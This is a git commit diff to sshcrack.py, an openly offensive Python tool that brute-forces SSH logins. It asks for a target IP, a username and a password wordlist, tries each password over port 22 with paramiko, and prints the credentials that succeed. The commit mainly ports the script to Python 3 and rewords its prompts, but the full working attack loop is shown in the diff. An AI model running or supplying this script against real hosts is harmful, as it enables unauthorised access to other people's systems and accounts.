f7447e9f5459e7238f9173f377a6f517ff96c50a
Falcon Rising <chinnidiwakar5@gmail.com>
2021-06-01 21:40:42 +0530

    Update sshcrack.py

--- sshcrack.py
+++ sshcrack.py
@@ -1,26 +1,27 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
-import socket, os, sys, paramiko
+import socket,os,sys,paramiko
 
-global host, user, file, line
+global host, username, file
 
 try:
-    host=input("\nPlease Enter Target IP Address: ")
-    username=input("\nPlease Enter the Username: ")
-    file=input("\nPlease Enter filename with full path: ")
+    host=input("\nPlease Enter Target IP: ")
+    username=input("\nPlease Enter The Username: ")
+    file=input("\nPlease Enter Password Dictionary With Full Path: ")
     if os.path.exists(file) == False:
-        print("\nFile Doesnt Exist")
+        print("\nFile Doesnt Exists :(")
         sys.exit()
+    else:
+        print("\nLoading The Password File :)")
 except KeyboardInterrupt:
-    print("\nUser Stopped The Script")
-    sys.exit()
+   print("\nUser Stopped The Script :(")
+   sys.exit()
 
-def ssh_connect(password, code=0):
+def ssh_connect(password,code=0):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
     try:
-        ssh.connect(host,port=22, username=username,password=password)
+        ssh.connect(host,port=22,username=username,password=password)
     except paramiko.AuthenticationException:
         code = 1
     except socket.error:
@@ -31,12 +32,12 @@ def ssh_connect(password, code=0):
 file = open(file)
 
 for word in file.readlines():
-    password= word.strip("\n")
+    password=word.strip("\n")
     try:
-        response = ssh_connect(password)
-        if response == 0:
-            print ("\nUser: %s   Password:  %s" %(username,password))
-        elif response == 2:
+        prob=ssh_connect(password)
+        if prob == 0:
+            print("\nUser: %s Password: %s"%(username,password))
+        elif prob == 2:
             print ("\nNetwork Error")
             sys.exit()
     except Exception:
